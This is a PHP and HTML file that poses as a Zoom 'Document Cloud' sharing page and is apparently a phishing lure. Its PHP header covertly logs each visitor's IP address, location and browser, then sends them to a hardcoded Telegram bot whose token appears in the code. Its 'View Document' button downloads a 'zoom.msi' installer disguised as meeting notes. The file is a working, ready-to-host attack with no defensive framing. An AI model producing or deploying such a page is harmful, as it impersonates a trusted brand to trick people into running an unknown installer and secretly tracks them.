<?php
// --- TELEGRAM NOTIFICATION LOGIC ---
$botToken = "8335040883:AAFjauUz-K0KN8c9RthrrnJi8eQU-rN9a24";
$chatId = "5835064705";

// Gather visitor details
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');
$page = "Zoom Document Landing Page";

// Simple IP location lookup (optional fallback)
$geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
$location = ($geo && $geo['status'] == 'success') ? "{$geo['city']}, {$geo['country']}" : "Unknown Location";

$msg = "<b>New Zoom Page Visit!</b>\n" .
       "<b>IP:</b> {$ip}\n" .
       "<b>Location:</b> {$location}\n" .
       "<b>Time:</b> {$time}\n" .
       "<b>Browser/Device:</b> {$userAgent}";

// Send alert to Telegram via cURL
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $msg,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@curl_exec($ch);
@curl_close($ch);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom Document Cloud</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f7f9fa;
            color: #232333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        header {
            padding: 20px 40px;
            background: #ffffff;
            border-bottom: 1px solid #e5e8eb;
        }
        .zoom-logo {
            font-size: 24px;
            font-weight: bold;
            color: #0b5cff;
            text-decoration: none;
        }
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #ffffff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            max-width: 450px;
            width: 100%;
            text-align: center;
            border: 1px solid #e5e8eb;
        }
        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #131619;
        }
        .subtitle {
            font-size: 14px;
            color: #747487;
            margin-bottom: 24px;
        }
        .doc-preview {
            display: flex;
            align-items: center;
            background: #f0f4ff;
            padding: 12px 16px;
            border-radius: 6px;
            margin-bottom: 24px;
            border-left: 4px solid #0b5cff;
            text-align: left;
        }
        .doc-info {
            font-size: 14px;
            font-weight: 500;
            color: #131619;
        }
        .doc-sub {
            font-size: 12px;
            color: #747487;
        }
        .download-btn {
            display: block;
            width: 100%;
            background-color: #0b5cff;
            color: white;
            padding: 12px 0;
            border-radius: 6px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            transition: background-color 0.2s;
            box-sizing: border-box;
            border: none;
            cursor: pointer;
        }
        .download-btn:hover {
            background-color: #0045cc;
        }
        footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #747487;
            border-top: 1px solid #e5e8eb;
            background: #ffffff;
        }
    </style>
</head>
<body>

    <header>
        <a href="#" class="zoom-logo">Zoom</a>
    </header>

    <div class="container">
        <div class="card">
            <h2>Document Attached</h2>
            <div class="subtitle">Zoom Document Cloud</div>
            
            <div class="doc-preview">
                <div>
                    <div class="doc-info">Click here to join meeting notes</div>
                    <div class="doc-sub">Prepared by Accounts</div>
                </div>
            </div>

            <!-- Triggers zoom.msi download -->
            <a href="zoom.msi" class="download-btn" download>View Document</a>
        </div>
    </div>

    <footer>
        Zoom. Copyright 2026 All Rights Reserved.
    </footer>

</body>
</html>